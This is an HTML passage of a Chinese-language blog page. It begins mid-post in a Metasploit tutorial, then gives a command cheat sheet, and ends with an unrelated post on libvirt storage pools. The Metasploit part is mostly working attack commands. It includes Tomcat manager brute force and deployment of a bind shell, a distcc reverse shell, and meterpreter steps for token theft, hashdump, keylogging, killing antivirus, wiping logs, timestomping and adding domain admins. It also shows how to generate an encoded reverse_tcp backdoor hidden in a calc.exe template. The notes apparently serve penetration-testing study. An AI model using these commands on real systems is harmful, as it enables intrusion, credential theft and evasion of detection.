class="token-line" style="color:#393A34"><span class="token plain">search tomcat_mgr_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhosts 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set threads 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rport 8180</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set verbose false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use multi/http/tomcat_mgr_deploy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set password tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set username tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhost 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lport 9999</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rport 8180</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell_bind_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search distcc_exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lhost 172.16.32.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhost 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show payloads</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload cmd/unix/reverse</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十五常用命令备忘">十五．常用命令备忘<a href="#十五常用命令备忘" class="hash-link" aria-label="十五．常用命令备忘的直接链接" title="十五．常用命令备忘的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfconsole--commands">MSFconsole  Commands<a href="#msfconsole--commands" class="hash-link" aria-label="MSFconsole  Commands的直接链接" title="MSFconsole  Commands的直接链接">​</a></h3>
<ul>
<li>show exploits 查看所有exploit</li>
<li>show payloads 查看所有payload</li>
<li>show auxiliary 查看所有auxiliary</li>
<li>search name 搜索exploit等</li>
<li>info 查看加载模块的信息</li>
<li>use name 加载模块</li>
<li>LHOST 本机IP</li>
<li>RHOST 目标IP</li>
<li>set function 设置选项值</li>
<li>setg function  全局设置</li>
<li>show options 查看选项</li>
<li>show targets 查看exp可选的平台</li>
<li>set target num 设置exp作用平台</li>
<li>set payload payload  设置payload</li>
<li>show advanced 查看高级选项</li>
<li>set autorunscript migrate -f 设置自动执行指令</li>
<li>check 测试是否可利用</li>
<li>exploit 执行exp或模块</li>
<li>exploit  -j 作为后台执行</li>
<li>exploit  -z 成功后不立即打开session</li>
<li>exploit  -e encoder 指定encoder</li>
<li>exploit  -h  查看帮助信息</li>
<li>sessions  -l -v 列出可用sessions详细信息</li>
<li>sessions  -s script 在指定session执行脚本</li>
<li>sessions -K 结束session</li>
<li>sessions -c cmd 执行指定命令</li>
<li>sessions -u sessionID 升级shell</li>
<li>db_create name 创建数据库</li>
<li>db_connect name   连接数据库</li>
<li>db_nmap nmap扫描并导入结果</li>
<li>db_autopwn -h      查看autopwn帮助</li>
<li>db_autopwn -p -r -e 基于端口，反弹shell</li>
<li>db_destroy 删除数据库</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="meterpreter-commands">Meterpreter Commands<a href="#meterpreter-commands" class="hash-link" aria-label="Meterpreter Commands的直接链接" title="Meterpreter Commands的直接链接">​</a></h3>
<ul>
<li>help 查看帮助</li>
<li>run scriptname 运行脚本</li>
<li>sysinfo 系统基本信息</li>
<li>ls 列目录</li>
<li>use priv 运行提权组件</li>
<li>ps 列进程</li>
<li>migrate PID PID迁移</li>
<li>use incognito token窃取</li>
<li>list_tokens -u 查看可用用户token</li>
<li>list_tokens -g 查看可用组token</li>
<li>impersonate_token DOMAIN_NAME\USERNAME 模仿token</li>
<li>steal_token PID 窃取PID所属token并模仿</li>
<li>drop_token 停止模仿token</li>
<li>getsystem 获取SYSTEM权限</li>
<li>shell 运行shell</li>
<li>execute -f cmd.exe -i 交互式运行cmd</li>
<li>execute -f cmd.exe -i -t 使用可用token运行</li>
<li>execute -f cmd.exe -i -H -t 同上，同时隐藏进程</li>
<li>rev2self 返回至初始用户</li>
<li>reg command 修改注册表</li>
<li>setkesktop number 切换至另一已登录用户屏幕</li>
<li>screenshot 截屏</li>
<li>upload file 上传文件</li>
<li>download file  下载文件</li>
<li>keyscan_start 开始截取击键记录</li>
<li>keyscan_stop 停止截取击键记录</li>
<li>getprivs 尽可能提升权限</li>
<li>uictl enable keyboard/mouse 获取键盘或鼠标的控制权</li>
<li>background 将当前meterpreter shell转入后台</li>
<li>hashdump 导出所有用户hash</li>
<li>use sniffer 加载嗅探模块</li>
<li>sniffer_interfaces 查看可用网卡接口</li>
<li>sniffer_dump interfaceID pcapname 开始嗅探</li>
<li>sniffer_start interfaceID packet-buffer 指定buffer范围嗅探</li>
<li>sniffer_stats interfaceID   抓取统计信息</li>
<li>sniffer_stop interfaceID  停止嗅探</li>
<li>add_user username password -h ip 添加用户</li>
<li>add_group_user &quot;Domain Admins&quot; username -h ip 添加用户至管理组</li>
<li>clearev 清空日志</li>
<li>timestomp 改变文件属性如创建时间等</li>
<li>reboot 重启</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfpayload-commands">MSFpayload Commands<a href="#msfpayload-commands" class="hash-link" aria-label="MSFpayload Commands的直接链接" title="MSFpayload Commands的直接链接">​</a></h3>
<ul>
<li>msfpayload -h 查看帮助</li>
<li>msfpayload windows/meterpreter/bind_tcp 0 查看指定payload可用选项</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 X &gt; payload.exe 生成payload.exe</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R &gt; payload.raw 保存为RAW格式，可用于msfencode</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=443 C &gt; payload.c 保存为C格式</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=443 J &gt; payload.java 保存为java格式</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfencode-commands">MSFencode Commands<a href="#msfencode-commands" class="hash-link" aria-label="MSFencode Commands的直接链接" title="MSFencode Commands的直接链接">​</a></h3>
<ul>
<li>msfencode -h 查看帮助</li>
<li>msfencode -l 查看可用encoder</li>
<li>msfencode -t (c,elf.exe,java.js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho) 以指定格式显示编码后的buffer</li>
<li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe 生成编码后的exe</li>
<li>msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c 生成纯字符格式C类型shellcode</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=443 R | <br>
<!-- -->msfencode -e x86/countdown -c 5 -t raw | <br>
<!-- -->msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded.exe 多编码器结合，多次编码</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfcli-commands">MSFcli Commands<a href="#msfcli-commands" class="hash-link" aria-label="MSFcli Commands的直接链接" title="MSFcli Commands的直接链接">​</a></h3>
<ul>
<li><code>msfcli | grep exploit</code> 只显示exploit</li>
<li><code>msfcli | grep exploit/windows</code> 只显示windows exploit</li>
<li><code>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.26 E</code> 针对指定IP加载指定exp并设定payload</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfninjafu">MSF,Ninja，Fu<a href="#msfninjafu" class="hash-link" aria-label="MSF,Ninja，Fu的直接链接" title="MSF,Ninja，Fu的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 使用calc.exe作为模板，生成经过编码的后门</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc,exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 与上面差不多，只是执行的时候不依赖于生成的可执行文件，且不会有任何提示信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe &amp;&amp; msfcli multi/hanler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E 生成编码后的payload并开始监听本机端口</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfvenom">MSFvenom<a href="#msfvenom" class="hash-link" aria-label="MSFvenom的直接链接" title="MSFvenom的直接链接">​</a></h3>
<ul>
<li>msfvenom --payload 自动生成payload</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="meterpreter-post-exploitation-commands">Meterpreter Post Exploitation Commands<a href="#meterpreter-post-exploitation-commands" class="hash-link" aria-label="Meterpreter Post Exploitation Commands的直接链接" title="Meterpreter Post Exploitation Commands的直接链接">​</a></h3>
<p>提权一般步骤</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; steal_token 1784</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user msf msf /add /DOMAIN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net group &quot;Domain Admins&quot; msf /add /DOMAIN</span><br></span></code></pre></div></div>
<p>获取hash一般步骤</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; hashdump</span><br></span></code></pre></div></div>
<p>如果是在win2008系统上：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run migrate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run killav</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; migrate 1436</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_dump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_stop</span><br></span></code></pre></div></div>
<p>使用Incognito提权</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use incognito</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens -u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens -u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; impersonate_token IHAZSECURITY\\Administrator</span><br></span></code></pre></div></div>
<p>查看保护机制并禁用之</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure -h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure -d -k</span><br></span></code></pre></div></div>
<ul>
<li>meterpreter&gt; run checkvm 检查是否是虚拟机</li>
<li>meterpreter&gt; shell 转入命令行</li>
<li>meterpreter&gt; run vnc 远程VNC控制</li>
<li>meterpreter&gt; background 转入后台</li>
<li>meterpreter&gt; run post/windows/escalate/bypassuac 执行Bypass UAC</li>
<li>meterpreter&gt; run post/osx/gather/hashdump 在OS X系统上dump hash</li>
<li>meterpreter&gt; run post/linux/gather/hashdump 在Linux 系统上dump hash</li>
</ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/msf">msf</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/security">security</a></li></ul></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2012/07/13/libvirt-storage-pool">libvirt中storage pool的管理</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-07-13T00:00:00.000Z">2012年7月13日</time> · <!-- -->阅读需 2 分钟</div></header><div class="markdown"><blockquote>
<p>简单演示如何在libvirt中创建storage pool</p>
</blockquote>
<p>libvirt提供了存储管理的功能，可以管理的存储类型有 目录  lvm逻辑卷 磁盘 iscsi存储  scsi存储  mpath netfs等，这里以最基本的目录类型为例</p>
<p>基本概念：</p>
<p>在libvirt里保存虚拟机磁盘镜像的目录或设备称作存储池  即pool  ，每个虚拟机 所使用的虚拟磁盘镜像称作卷 即vol ，vol是存储在pool里面的。</p>
<p>我们可以使用命令行的virsh工具来管理，pool有两种基本状态：活动和非活动，查看当前存储池的状态</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-list --all </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name State Autostart </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default inactive yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disk active yes</span><br></span></code></pre></div></div>
<p>新建一个基于目录的存储池bigpool 存储路径为 /bigpool</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-define-as bigpool dir - - - - /bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool defined</span><br></span></code></pre></div></div>
<p>这时候pool仅仅是定义出来了，可以用pool-list --all查看到。但是相应的目录是不存在的，接着需要建立这个pool</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-build bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool built</span><br></span></code></pre></div></div>
<p>这个时候才是真正的建立起这个pool，libvirt会自动创建/bigpool目录，并设置相应的权限，如果你有用selinux作为libvirt的安全措施的话它还能自动设置上下文</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># ls -Zld /bigpool/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwx------ 2 ? root root 4096 Jul 13 12:54 /bigpool/</span><br></span></code></pre></div></div>
<p>我这里由于没有使用selinux所以没有上下文的</p>
<p>pool创建好之后就可以启动了</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-start bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool started</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-list --all </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name State Autostart </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bigpool active no </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default inactive yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disk active yes</span><br></span></code></pre></div></div>
<p>还可以设置pool为自动启动</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-autostart bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool marked as autostarted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-list --all </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name State Autostart </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bigpool active yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default inactive yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disk active yes</span><br></span></code></pre></div></div>
<p>基于目录的一个存储池就这样建立完成了，是不是很简单？</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/storage-pool">storage pool</a></li></ul></div></footer></article><nav class="pagination-nav" aria-label="博文列表分页导航"><a class="pagination-nav__link pagination-nav__link--prev" href="/notes/blog/page/3"><div class="pagination-nav__label">较新的博文</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/notes/blog/page/5"><div class="pagination-nav__label">较旧的博文</div></a></nav></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 老司机.</div></div></div></footer></div>
</body>
</html>